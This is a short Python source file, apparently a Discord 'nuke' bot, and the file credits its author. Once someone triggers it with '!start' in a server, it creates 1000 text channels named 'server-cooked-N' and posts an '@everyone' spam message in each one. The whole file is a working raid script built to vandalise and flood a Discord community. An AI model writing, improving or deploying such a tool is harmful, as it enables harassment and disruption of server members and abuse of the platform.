# soulless.py by @johanxq4
# After u added ur token u can start it with !start command

import discord
from discord.ext import commands

TOKEN = "Ur Token Here" # Add Ur Token Here

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot Logined as {bot.user}")

@bot.command()
async def start(ctx):
    guild = ctx.guild
    for i in range(1000):
        channel = await guild.create_text_channel(f"server-cooked-{i+1}")
        await channel.send("@everyone this server is cooked :skull: by @johanxq4")

bot.run(TOKEN)
